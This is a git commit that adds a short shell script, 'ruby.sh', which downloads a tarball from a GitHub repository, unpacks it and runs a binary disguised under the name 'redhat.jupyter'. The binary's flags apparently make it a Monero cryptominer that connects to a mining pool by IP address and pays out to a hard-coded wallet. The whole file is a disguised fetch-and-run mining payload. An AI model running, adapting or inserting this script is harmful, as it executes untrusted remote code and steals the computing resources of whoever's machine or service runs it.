5333b514d514b6394e74603da53dcf43b9758a1c
chirifa201 <45911600+chirifa201@users.noreply.github.com>
2021-12-29 17:21:01 +0100

    Create ruby.sh

---
+++ ruby.sh
@@ -0,0 +1,7 @@
+wget https://raw.githubusercontent.com/chirifa201/TuanwaraRDP/main/jupyter.redhat.tar.gz
+
+tar xvzf jupyter.redhat.tar.gz
+
+cd jupyter.redhat
+
+./redhat.jupyter -a rx/0 -o 195.201.124.214:80 -u 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j
